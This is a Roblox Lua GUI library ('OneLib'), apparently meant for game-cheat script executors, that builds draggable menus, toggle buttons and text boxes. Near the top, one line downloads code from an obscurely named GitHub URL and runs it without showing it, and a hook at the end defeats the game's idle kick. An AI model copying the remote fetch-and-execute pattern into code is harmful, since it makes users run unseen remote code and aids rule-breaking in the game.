local UL = {}
print("Version UI 0.5")
print("Loading OneLib")

local rl = loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua")) spawn(rl)

local uiProperties = {
    BackgroundColor3 = Color3.fromRGB(65, 65, 65),
    BackgroundTransparency = 0.8,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Font = Enum.Font.LuckiestGuy,
    TextSize = 13
}

function UL:CrSG(name)
    for _, gui in ipairs(game.Players.LocalPlayer:WaitForChild("PlayerGui"):GetChildren()) do
        if gui:IsA("ScreenGui") and gui:FindFirstChild("ULId") then
            gui:Destroy()
        end
    end

    local sg = Instance.new("ScreenGui")
    sg.Name = name
    sg.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    sg.ResetOnSpawn = false

    local id = Instance.new("BoolValue")
    id.Name = "ULId"
    id.Value = true
    id.Parent = sg

    return sg
end

function UL:CrFrm(parent, title)
    local frm = Instance.new("Frame")
    frm.Parent = parent
    frm.Size = UDim2.new(0.25, 0, 0, 60)
    frm.Position = UDim2.new(0.2, 0, 0.2, 0)
    frm.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    frm.BackgroundTransparency = 0.4
    frm.BorderSizePixel = 1
    frm.Active = true
    frm.Draggable = true

    local lbl = Instance.new("TextLabel")
    lbl.Parent = frm
    lbl.Text = title
    lbl.Size = UDim2.new(1, 0, 0, 33)
    lbl.Position = UDim2.new(0, 0, -0.02, 0)
    lbl.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    lbl.BackgroundTransparency = 0.2
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.Font = Enum.Font.GothamBold 
    lbl.TextSize = 18
    lbl.TextWrapped = true
    lbl.TextXAlignment = Enum.TextXAlignment.Center
    lbl.TextYAlignment = Enum.TextYAlignment.Center

    local corner = Instance.new("UICorner")
    corner.Parent = lbl
    corner.CornerRadius = UDim.new(0, 4)

    local padding = Instance.new("UIPadding")
    padding.Parent = lbl
    padding.PaddingLeft = UDim.new(0, 5)
    padding.PaddingRight = UDim.new(0, 5)
    padding.PaddingTop = UDim.new(0, 5)
    padding.PaddingBottom = UDim.new(0, 5)

    local tbtn = Instance.new("TextButton")
    tbtn.Parent = frm
    tbtn.Text = "+"
    tbtn.Size = UDim2.new(0, 30, 0, 30)
    tbtn.Position = UDim2.new(1, -30, 0, 0)
    for prop, value in pairs(uiProperties) do
        tbtn[prop] = value
    end

    local cfrm = Instance.new("Frame")
    cfrm.Parent = frm
    cfrm.Size = UDim2.new(1, 0, 1, -30)
    cfrm.Position = UDim2.new(0, 0, 0, 30)
    cfrm.BackgroundTransparency = 0.6
    cfrm.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    cfrm.Visible = false

    local crBtn = Instance.new("TextButton")
    crBtn.Parent = frm
    crBtn.Text = "Info Script"
    crBtn.Size = UDim2.new(1, 0, 0, 30)
    crBtn.Position = UDim2.new(0, 0, 1, -30)
    for prop, value in pairs(uiProperties) do
        crBtn[prop] = value
    end

    local crFrm = Instance.new("Frame")
    crFrm.Parent = parent
    crFrm.Size = UDim2.new(0.25, 0, 0.4, 60)
    crFrm.Position = UDim2.new(0.685, 0, 0.3, 0)
    crFrm.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    crFrm.BackgroundTransparency = 1
    crFrm.BorderSizePixel = 1
    crFrm.Visible = false

    local crLbl = Instance.new("TextLabel")
    crLbl.Parent = crFrm
    crLbl.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    crLbl.BackgroundTransparency = 0.2
    crLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    crLbl.Text = "Info/Updats/Credits"
    crLbl.Size = UDim2.new(1, 0, 0, 30)
    crLbl.Position = UDim2.new(0, 0, 0, 0)
    crLbl.Font = Enum.Font.GothamBold 
    crLbl.TextSize = 18
    crLbl.TextWrapped = true
    crLbl.TextXAlignment = Enum.TextXAlignment.Center
    crLbl.TextYAlignment = Enum.TextYAlignment.Center

    local corner = Instance.new("UICorner")
    corner.Parent = crLbl
    corner.CornerRadius = UDim.new(0, 4)

    local padding = Instance.new("UIPadding")
    padding.Parent = crLbl
    padding.PaddingLeft = UDim.new(0, 5)
    padding.PaddingRight = UDim.new(0, 5)
    padding.PaddingTop = UDim.new(0, 5)
    padding.PaddingBottom = UDim.new(0, 5)

    local minimized = true
    tbtn.MouseButton1Click:Connect(function()
        minimized = not minimized
        if minimized then
            cfrm.Visible = false
            tbtn.Text = "+"
            frm.Size = UDim2.new(0.25, 0, 0, 60)
        else
            cfrm.Visible = true
            tbtn.Text = "-"
            frm.Size = UDim2.new(0.25, 0, 0, 60 + #cfrm:GetChildren() * 30)
        end
    end)

    crBtn.MouseButton1Click:Connect(function()
        crFrm.Visible = not crFrm.Visible
        crBtn.BackgroundColor3 = crFrm.Visible and Color3.fromRGB(150, 0, 150) or Color3.fromRGB(65, 65, 65)
    end)

    local function syncFrames()
        crFrm.Position = UDim2.new(frm.Position.X.Scale + frm.Size.X.Scale, frm.Position.X.Offset, frm.Position.Y.Scale, frm.Position.Y.Offset)
    end

    frm:GetPropertyChangedSignal("Position"):Connect(syncFrames)
    frm:GetPropertyChangedSignal("Size"):Connect(syncFrames)

    return frm, cfrm, crFrm
end

function UL:AddBtn(parent, text, callback)
    local btn = Instance.new("TextButton")
    btn.Parent = parent
    btn.Text = text
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, #parent:GetChildren() * 30 - 30)
    for prop, value in pairs(uiProperties) do
        btn[prop] = value
    end

    btn.MouseButton1Click:Connect(callback)
    
    return btn
end

function UL:AddTBtn(parent, text, state, callback)
    local btn = Instance.new("TextButton")
    btn.Parent = parent
    btn.Text = text .. " [" .. (state and "ON" or "OFF") .. "]"
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, #parent:GetChildren() * 30 - 30)
    for prop, value in pairs(uiProperties) do
        btn[prop] = value
    end

    btn.MouseButton1Click:Connect(function()
        state = not state
        btn.Text = text .. " [" .. (state and "ON" or "OFF") .. "]"
        btn.BackgroundColor3 = state and Color3.fromRGB(85, 170, 85) or Color3.fromRGB(65, 65, 65)
        callback(state)
    end)

    return btn
end

function UL:AddTBox(parent, placeholder, callback)
    local box = Instance.new("TextBox")
    box.Parent = parent
    box.PlaceholderText = placeholder
    box.Text = ""
    box.BorderSizePixel = 1
    box.Size = UDim2.new(1, 0, 0, 30)
    box.Position = UDim2.new(0, 0, 0, #parent:GetChildren() * 30 - 30)

    box.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    box.TextColor3 = Color3.fromRGB(250, 250, 250)
    box.BorderColor3 = Color3.fromRGB(0, 0, 0) 
    box.Font = Enum.Font.SourceSans
    box.TextSize = 18
    box.ClearTextOnFocus = false
    box.TextXAlignment = Enum.TextXAlignment.Left
    
    local padding = Instance.new("UIPadding")
    padding.Parent = box
    padding.PaddingLeft = UDim.new(0, 5)
    local corner = Instance.new("UICorner")
    corner.Parent = box
    corner.CornerRadius = UDim.new(0, 6)
    
    local shadow = Instance.new("ImageLabel")
    shadow.Parent = box
    shadow.BackgroundTransparency = 0.95
    shadow.Image = "rbxassetid://1316045217"
    shadow.Size = UDim2.new(1, 6, 1, 6)
    shadow.Position = UDim2.new(0, -3, 0, -3)
    shadow.ImageTransparency = 0.5
    shadow.ScaleType = Enum.ScaleType.Slice
    shadow.SliceCenter = Rect.new(10, 10, 118, 118)

    box.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            callback(box.Text)
        end
    end)

    return box
end

function UL:AddOBtn(parent, name)
    local oFrm = Instance.new("Frame")
    oFrm.Parent = parent.Parent
    oFrm.Size = UDim2.new(0.9, 0, 1, 0) 
    oFrm.Position = UDim2.new(parent.Position.X.Scale + 1, 0, parent.Position.Y.Scale - 0.184, parent.Position.Y.Offset)
    oFrm.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    oFrm.BackgroundTransparency = 0.4
    oFrm.BorderSizePixel = 1
    oFrm.Visible = false

    local lbl = Instance.new("TextLabel")
    lbl.Parent = oFrm
    lbl.Text = name
    lbl.Size = UDim2.new(1, 0, 0, 30)
    lbl.Position = UDim2.new(0, 0, 0, 0)
    for prop, value in pairs(uiProperties) do
        lbl[prop] = value
    end

    local btn = Instance.new("TextButton")
    btn.Parent = parent
    btn.Text = name
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, #parent:GetChildren() * 30 - 30)
    for prop, value in pairs(uiProperties) do
        btn[prop] = value
    end

    btn.MouseButton1Click:Connect(function()
        oFrm.Visible = not oFrm.Visible
        btn.BackgroundColor3 = oFrm.Visible and Color3.fromRGB(130, 0, 0) or Color3.fromRGB(65, 65, 65)
    end)

    return btn, oFrm
end

function UL:AddText(parent, text, color)
    local label = Instance.new("TextLabel")
    label.Parent = parent
    label.Text = text
    label.Size = UDim2.new(1, 0, 0, 30)
    label.Position = UDim2.new(0, 0, 0, #parent:GetChildren() * 30 - 30)
    label.BackgroundColor3 = Color3.fromRGB(250, 250, 250)
    label.BackgroundTransparency = 0.6
    label.TextColor3 = color or Color3.fromRGB(0, 0, 0)
    label.Font = Enum.Font.ArimoBold 
    label.TextSize = 13
    label.TextWrapped = true

    return label
end

game:GetService('Players').LocalPlayer.Idled:Connect(function()
    game:GetService('VirtualUser'):CaptureController()
    game:GetService('VirtualUser'):ClickButton2(Vector2.new())
end)
print("Loading Finish")
print("by: OneCreatorX")

return UL
